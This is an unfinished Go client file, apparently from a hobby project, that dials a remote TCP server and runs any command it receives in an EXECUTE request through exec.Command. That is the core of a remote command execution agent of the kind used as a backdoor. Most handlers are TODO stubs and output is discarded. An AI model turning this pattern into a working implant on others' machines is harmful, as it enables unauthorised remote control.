package client

import (
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"

	. "../commons"
)

// ============================Exportables==========================

type Client struct {
	AddrToJoin       string
	Port             string
	commandToExecute chan string
}

func NewClient(addr, port string) Client {
	commandBuffer := make(chan string, 1)
	return Client{AddrToJoin: addr, Port: port, commandToExecute: commandBuffer}
}

func (client *Client) Communicate() {
	addr := client.AddrToJoin + ":" + client.Port
	conn, err := net.Dial("tcp", addr)

	if err != nil {
		// TODO
	}

	defer client.tryNotifyAndClose(&conn)
	defer println("Works") // DEBUG
	conn.SetDeadline(time.Time{})

	go client.handleReceives(&conn)

	// Prevents the process from exiting right away
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sig
}

// ==============================Internals============================

func (client *Client) handleReceives(connPtr *net.Conn) {
	conn := *connPtr
	buffer := make([]byte, 1024)

	for {
		n, err := conn.Read(buffer)

		switch err {
		case net.ErrClosed:
			// TODO (idk what to do)
			continue
		}

		receivedReq := ParseIntoRequest(buffer[:n])
		client.processRequestAndSendResponse(receivedReq)
	}
}

func (client *Client) processRequestAndSendResponse(req Request) {
	switch req.Status {
	case PING:
		// TODO
	case REQUESTING_CLOSE:
		// TODO
	case REDIRECT:
		// TODO
	case EXECUTE:
		// TODO
		rawCommand := strings.TrimSuffix(req.Payload, "\n")
		command, params := parseIntoCommandAndParams(rawCommand)
		out, err := exec.Command(command, params...).Output()

		if err != nil {
			// TODO
		} else {
			// TODO
		}
	}
}

func (client *Client) tryNotifyAndClose(connPtr *net.Conn) {
	conn := *connPtr
	conn.Write([]byte{REQUESTING_CLOSE})
	os.Exit(0)
}
